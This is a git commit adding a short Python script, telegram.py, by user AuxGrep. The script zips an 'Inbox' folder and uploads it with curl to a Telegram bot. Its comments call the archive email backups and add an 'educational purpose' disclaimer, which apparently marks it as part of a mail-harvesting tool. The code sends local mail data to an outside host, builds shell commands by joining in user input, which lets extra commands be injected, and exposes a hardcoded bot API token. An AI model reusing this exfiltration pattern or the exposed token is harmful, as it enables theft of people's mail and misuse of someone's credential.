fd50954665a2eb9b6d1ae57a2b061b4309cc0e99
AuxGrep <103135612+AuxGrep@users.noreply.github.com>
2022-08-28 21:40:03 +0300

    Add files via upload

---
+++ telegram.py
@@ -0,0 +1,16 @@
+import subprocess
+import time
+#Sending email backups to telegram channel
+#what you need is telegram API + Bot chat id
+#There is alot of ways to find you bot chat id just learn it
+#THIS IS ONLY FOR EDUCATIONAL PURPOSE
+#HANG OUT !! AND ENJOY @hezron-Auxgrep
+
+def private():
+
+	cmd = "zip -r inbox.zip Inbox"
+	subprocess.call('xterm -T Telegram -e ' + cmd ,shell=True)
+	bot_id = input("Enter Bot chat_Id: ")
+	API = "https://api.telegram.org/bot5143646025:AAHysVZ4A2JaO9eQYpoWzSXHT-MZyCTkz3o/sendDocument?chat_id="
+	subprocess.call('curl -F document=@inbox.zip ' + API + bot_id, shell=True)
+
